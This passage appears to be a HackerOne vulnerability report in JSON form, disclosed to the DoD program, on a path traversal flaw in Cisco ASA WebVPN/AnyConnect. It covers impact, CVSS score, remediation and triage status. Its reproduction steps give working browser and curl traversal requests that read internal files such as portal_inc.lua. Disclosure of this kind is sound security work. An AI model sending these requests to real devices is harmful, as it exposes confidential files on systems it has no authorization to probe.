An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences to an affected device.\n\n## Step-by-step Reproduction Instructions\n## In Browser:\n1. Copy and paste into your browser: ███/+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026default-language\u0026lang=../\"\n2. Note the file being requested to be download. This will be the source code for portal_inc.lua which is not normally accessible. \n\n##In curl:\n1. curl -k \"████████/+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/portal_inc.lua\u0026default-language\u0026lang=../\" to prove you can read internal files such as the /+CSCOE+/portal_inc.lua file.\n2. Various internal files can be read, and some require using the --output command to output the data to a file as shown in step 3.\n3. curl -k \"█████████/+CSCOT+/translation-table?type=mst\u0026textdomain=/%2bCSCOE%2b/http_auth.html\u0026default-language\u0026lang=../\" --output session.js\n\n## Product, Version, and Configuration (If applicable)\nAnyConnect SSL VPN -webvpn\nClientless SSL VPN - webvpn\n\n## Suggested Mitigation/Remediation Actions\nUpdate the software to the latest version via the Cisco advisory linked above in the Summary.\n\n## Impact\n\nAn attacker can view arbitrary files within the web services file system on the targeted device that are meant to be internal or confidential. The web services file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. \nCVSS Score: Base 7.5\nVector: https://tools.cisco.com/security/center/cvssCalculator.x?version=3.1\u0026vector=CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":16,"voters":["pretorian","mattberg","sodium_","dastan_9408","salahhasoneh","akashhamal0x01","zimmer75","sa1tama0","h1-qualys-scan","kccca","and 6 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8955726,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-08-17T10:42:29.236Z","updated_at":"2020-08-17T10:42:29.236Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":820294},"actor":{"username":"agent-j5","cleared":false,"url":"/agent-j5","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8955727,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner.
